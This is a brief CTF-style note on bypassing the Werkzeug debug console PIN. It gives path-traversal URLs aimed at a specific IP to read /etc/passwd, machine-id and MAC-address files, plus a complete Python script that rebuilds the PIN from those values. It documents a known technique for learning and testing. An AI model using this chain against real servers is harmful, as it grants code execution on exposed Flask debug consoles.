# Werkzeug Console PIN bypass

[https://ctftime.org/writeup/17955](https://ctftime.org/writeup/17955)

We need LFI vulnerability.

```
probably_public_bits = [ 
  'web3_user' , # username http://45.77.245.232:7004/read%2F..%2F../etc/passwd
  'flask.app' , # modname Always the same 
  'Flask' , # Always the same
  '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr (mod, '__file__', None) Error Message: http://45.77.245.232:7004/read%2F..%2F../wrong/file
  ] 

private_bits = [ 
  '94558041547692' , # http://45.77.245.232:7004/read%2F..%2F..%2Fetc/network/interfaces | http://45.77.245.232:7004/read%2F..%2F..%2Fsys/class/net/ens3/address
  'd4e6cb65d59544f3331ea0425dc555a1' # http://45.77.245.232:7004/read%2F..%2F..%2Fetc/machine-id
  ]
```

pingenerate.py

```
import hashlib 
from itertools import chain
import os
import getpass

pin = None
rv = None
num = None

probably_public_bits = [ 
  'h4ckua11' , # username 
  'flask.app' , # modname
  'Flask',
  '/usr/local/lib/python2.7/dist-packages/flask/app.py' 
  ] 

private_bits = [ 
  '191101483950643' ,
  'my serial number'
  ] 

h = hashlib.md5() 

# Bit is going through every thing in probably_public_bits and private_bits

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, unicode):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt") 

if num is None : 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None : 
    for group_size in 5 , 4 , 3 : 
        if len (num)% group_size == 0 : 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' ) 
            for x in range ( 0 , len (num), group_size)) 
            break 
        else : 
            rv = num

print (rv)
```
